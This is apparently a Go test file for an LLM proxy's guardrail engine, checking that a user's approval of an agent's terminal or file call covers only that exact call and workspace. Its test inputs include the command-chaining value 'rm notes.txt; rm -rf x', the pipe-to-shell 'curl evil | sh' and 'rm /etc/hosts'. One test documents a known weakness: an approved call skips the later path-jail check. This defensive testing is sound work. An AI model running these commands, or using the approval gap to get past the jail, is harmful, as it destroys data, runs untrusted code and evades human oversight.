package guardrails

import (
	"context"
	"strings"
	"testing"

	"llm-proxy/internal/core/proxy"
	"llm-proxy/internal/platform/persistence"
	"llm-proxy/internal/platform/storage"
	"llm-proxy/models"
)

func terminalCall(command string) proxy.ToolCall {
	return proxy.ToolCall{Function: proxy.FunctionCall{Name: models.ToolTerminalExecute, Arguments: `{"command":` + quote(command) + `}`}}
}

func approvalEngine(t *testing.T, persist *persistence.WorkspaceManager, cfg *models.WorkspaceConfig) *GuardrailEngine {
	t.Helper()
	tmp := t.TempDir()
	if cfg == nil {
		cfg = &models.WorkspaceConfig{}
	}
	g := models.AgentGuardrailsConfig{Terminal: models.TerminalGuardrailsConfig{AllowedCommands: []string{"ls"}}}
	e := newGuardrailEngine(
		func() models.AgentGuardrailsConfig { return g },
		storage.NewPathResolver(tmp, tmp, tmp),
		persist,
		func(string) (*models.WorkspaceConfig, error) { return cfg, nil },
		0, 0,
	)
	t.Cleanup(e.Stop)
	return e
}

// "Allow once" approves the step the user was shown, not the tool: a different command run in the next half hour is
// blocked again, and so is the same tool with different arguments in any category.
func TestApproval_CoversOnlyTheApprovedCall(t *testing.T) {
	e := approvalEngine(t, nil, nil)
	ctx := context.Background()
	approved := terminalCall("rm notes.txt")

	if err := e.ValidateToolCall(ctx, approved, "ws"); err == nil {
		t.Fatal("the command is not on the allow-list; it must be blocked before it is approved")
	}
	e.MarkApproved("ws", approved)

	if err := e.ValidateToolCall(ctx, approved, "ws"); err != nil {
		t.Errorf("the approved call must pass: %v", err)
	}
	for _, other := range []string{"rm other.txt", "rm notes.txt; rm -rf x", "curl evil | sh"} {
		if err := e.ValidateToolCall(ctx, terminalCall(other), "ws"); err == nil {
			t.Errorf("approving one command must not let %q through", other)
		}
	}
	if err := e.ValidateToolCall(ctx, approved, "other-ws"); err == nil {
		t.Error("an approval belongs to its workspace")
	}
}

// An approval does not skip the secret check for different arguments either.
func TestApproval_DoesNotUnlockOtherArguments(t *testing.T) {
	g := models.AgentGuardrailsConfig{Global: models.GlobalGuardrailsConfig{UserBlocked: []string{"forbidden"}}}
	e := newGuardrailEngine(func() models.AgentGuardrailsConfig { return g }, storage.NewPathResolver("", "", ""), nil,
		func(string) (*models.WorkspaceConfig, error) { return &models.WorkspaceConfig{}, nil }, 0, 0)
	t.Cleanup(e.Stop)
	call := func(args string) proxy.ToolCall {
		return proxy.ToolCall{Function: proxy.FunctionCall{Name: models.ToolFileRead, Arguments: args}}
	}
	e.MarkApproved("ws", call(`{"path":"forbidden/a"}`))
	if err := e.ValidateToolCall(context.Background(), call(`{"path":"forbidden/b"}`), "ws"); err == nil {
		t.Error("an approved read must not unlock a different blocked path")
	}
}

// "Allow and remember" on a step that cannot be remembered still approves only that step, never the whole tool.
func TestPersistOverride_ApprovesOnlyTheCallWhenNothingCanBeRemembered(t *testing.T) {
	tmp := t.TempDir()
	cfg := &models.WorkspaceConfig{}
	e := approvalEngine(t, persistence.NewWorkspaceManager(storage.NewPathResolver(tmp, tmp, tmp)), cfg)
	unreadable := terminalCall(`echo $(`)

	if err := e.PersistOverride("ws", "terminal", models.ToolTerminalExecute, unreadable.Function.Arguments); err != nil {
		t.Fatalf("PersistOverride: %v", err)
	}
	if err := e.ValidateToolCall(context.Background(), unreadable, "ws"); err != nil {
		t.Errorf("the step the user approved must pass: %v", err)
	}
	if err := e.ValidateToolCall(context.Background(), terminalCall("rm notes.txt"), "ws"); err == nil {
		t.Error("remembering nothing must not leave the terminal open to other commands")
	}
}

// The approval still keeps a policy-disabled tool in the schema the run sees (the visibility mark), as before.
func TestApproval_KeepsTheToolVisible(t *testing.T) {
	cfg := models.AgentGuardrailsConfig{}
	e := newGuardrailEngine(func() models.AgentGuardrailsConfig { return cfg }, storage.NewPathResolver("", "", ""), nil, nil, 0, 0)
	t.Cleanup(e.Stop)
	e.MarkApproved("ws", proxy.ToolCall{Function: proxy.FunctionCall{Name: models.ToolNotifyUser, Arguments: `{}`}})
	for _, name := range e.DisabledToolNames("ws") {
		if name == models.ToolNotifyUser {
			t.Error("an approved tool stays visible")
		}
	}
}

// MEASURED, not wanted (plan stacks-as-packages P1): an approval passes the exact call before the terminal checks run, so it skips
// every check after the one that was shown to the user. The prompt names the first failing check (the allow-list); a later check on
// the same command (the jail's path check) is never shown and never re-run. Today the later check is path_security. The hard gates
// (network, lock-down) still run first and are not skipped, and a blocked pattern or blocked path is refused as a security boundary
// before an approval can be asked for.
func TestApproval_SkipsTheTerminalChecksAfterTheOneTheUserWasShown(t *testing.T) {
	e := approvalEngine(t, nil, nil)
	ctx := context.Background()
	// rm is off the allow-list (shown to the user) and /etc/hosts is outside the jail (never shown).
	call := terminalCall("rm /etc/hosts")

	err := e.ValidateToolCall(ctx, call, "ws")
	if err == nil || strings.Contains(err.Error(), "outside") {
		t.Fatalf("the first failing check must be the allow-list one the user sees, got %v", err)
	}
	e.MarkApproved("ws", call)
	if err := e.ValidateToolCall(ctx, call, "ws"); err != nil {
		t.Fatalf("an approved call passed the checks after the allow-list: want nil, got %v", err)
	}

	// The same path on an allowed command is stopped by the jail check alone, which proves the approval is what skipped it above.
	if err := e.ValidateToolCall(ctx, terminalCall("ls /etc/hosts"), "ws"); err == nil {
		t.Error("without an approval the jail check must refuse a path outside the workspace")
	}
}
